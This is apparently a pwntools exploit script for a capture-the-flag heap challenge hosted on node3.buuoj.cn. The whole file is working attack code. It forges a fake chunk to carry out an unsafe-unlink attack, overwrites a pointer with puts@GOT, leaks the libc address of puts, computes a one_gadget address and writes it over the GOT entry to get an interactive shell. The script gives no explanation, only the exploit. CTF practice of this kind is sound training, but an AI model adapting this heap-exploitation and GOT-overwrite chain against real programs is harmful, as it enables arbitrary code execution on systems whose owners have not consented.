from pwn import *

io=remote('node3.buuoj.cn',25730)

def add(size,data):
    io.recvuntil('choice:')
    io.sendline('2')
    io.recvuntil('item name:')
    io.sendline(str(size))
    io.recvuntil('item:')
    io.send(data)

def edit(idx,size,data):
    io.recvuntil('choice:')
    io.sendline('3')
    io.recvuntil('index of item:')
    io.sendline(str(idx))
    io.recvuntil('item name:')
    io.sendline(str(size))
    io.recvuntil('the item:')
    io.send(data)

def free(idx):
    io.recvuntil('choice:')
    io.sendline('4')
    io.recvuntil('item:')
    io.sendline(str(idx))

def show():
    io.recvuntil('choice:')
    io.sendline('1')

ptr=0x6020d8
puts_got=0x602020

add(0x28,'a')#0
add(0x28,'b')#1
add(0x80,'c')#2
add(0x60,'d')#3

edit(1,0x100,p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20)+p64(0x90))
free(2)
edit(1,0x10,p64(0)+p64(puts_got))
show()
io.recvuntil('0 : ')
puts_add=u64(io.recv(6).ljust(8,'\x00'))
print(hex(puts_add))
libc_base=puts_add-0x06f690
one_gadget=libc_base+0x45216
edit(0,8,p64(one_gadget))

io.interactive()
